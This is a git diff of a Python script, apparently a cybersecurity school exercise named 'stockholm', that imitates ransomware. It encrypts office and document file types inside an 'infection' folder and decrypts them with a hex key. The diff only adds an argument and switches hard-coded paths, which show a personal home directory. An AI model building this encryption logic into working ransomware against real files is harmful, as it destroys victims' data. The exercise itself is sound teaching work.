@@ -38,7 +38,7 @@ def decrypt_file(file_path, key, original_ext):
     return decrypted_file_path
 
 
-def encrypt_files_in_directory(directory, key):
+def encrypt_files_in_directory(directory, key, args):
     valid_extensions = {
         '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
         '.odt', '.ott', '.sxw', '.stw', '.uot', '.pdf',
@@ -74,7 +74,7 @@ def encrypt_files_in_directory(directory, key):
         json.dump(metadata, metadata_file)
 
 
-def decrypt_files_in_directory(directory, key):
+def decrypt_files_in_directory(directory, key, args):
     with open("metadata.json", "r") as metadata_file:# Charger les métadonnées depuis le fichier JSON
         metadata = json.load(metadata_file)
 
@@ -109,8 +109,8 @@ def main():
         parser.add_argument("-r", "--reverse", type=str, help="Decrypt the files with the provided key (hex format)")
         args = parser.parse_args()
 
-        #directory_path = "/Users/melissaadjogoua/Desktop/piscine/stockholm/infection"
-        directory_path = "/mnt/nfs/homes/madjogou/Desktop/piscine_cyber/stockholm/infection"
+        #directory_path = "/mnt/nfs/homes/madjogou/Desktop/piscine_cyber/stockholm/infection"
+        directory_path = "/Users/melissaadjogoua/Desktop/stockholm/infection"
         #It must only work in a folder called infection in the user’s HOME directory. donc mettre dans la vm :
         #directory_path = "/mnt/nfs/homes/infection"
         key_file_path = 'encryption_key.txt'
@@ -121,11 +121,11 @@ def main():
             save_key(key_file_path, encryption_key)
 
         if not args.reverse:
-            encrypt_files_in_directory(directory_path, encryption_key)
+            encrypt_files_in_directory(directory_path, encryption_key, args)
         elif args.reverse:
             try:
                 provided_key = bytes.fromhex(args.reverse)
-                decrypt_files_in_directory(directory_path, provided_key)
+                decrypt_files_in_directory(directory_path, provided_key, args)
             except ValueError:
                 print("Error: Invalid hex key for decryption")
     except KeyboardInterrupt:
